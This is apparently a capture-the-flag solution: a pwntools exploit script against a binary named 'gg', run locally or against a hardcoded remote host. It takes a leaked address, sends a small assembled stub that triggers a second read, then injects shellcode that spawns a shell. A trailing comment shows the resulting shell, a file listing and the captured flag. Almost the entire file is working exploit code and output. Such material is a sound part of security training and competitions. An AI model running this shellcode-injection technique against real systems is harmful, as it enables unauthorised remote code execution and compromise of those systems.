from pwn import *
import time
import sys

def gg(DEBUG):
	context.arch = "amd64"
	t = 0.3
	
	def a(s):
		return asm(s, arch = "amd64", os = "linux")
	
	if DEBUG=="1":
		t = 0.005
		r = process("./gg")
		raw_input("debug?")
	elif DEBUG=="2":
		HOST = '34.218.199.37'
		PORT = 5000
		r = remote(HOST,PORT)
	
	shellcode = a(shellcraft.amd64.linux.sh())
	res = r.recv(len("0x7ffff7ff6000"))
	r.recv(0x1000)
	shelladdr =  int(res,16)
	log.info('shell: %#x' % shelladdr)
	payload = p64(shelladdr)
	r.send(payload)
	payload_readmore = a("""pop rax
	sub rax, 0x15
	push rax
	push rax
	pop rdx
	""")
	payload_readmore = payload_readmore.ljust(8,"\x90")
	r.send(payload_readmore)
	
	r.sendline(shellcode) # 0x400837                 call    _read
	r.interactive() 
	
gg(sys.argv[1])
"""
id
uid=1000(pwn) gid=1000(pwn) groups=1000(pwn)
$ ls
flag.txt
gg
$ cat f*
flag{woah_those_must_have_been_some_good_rets}
$  
"""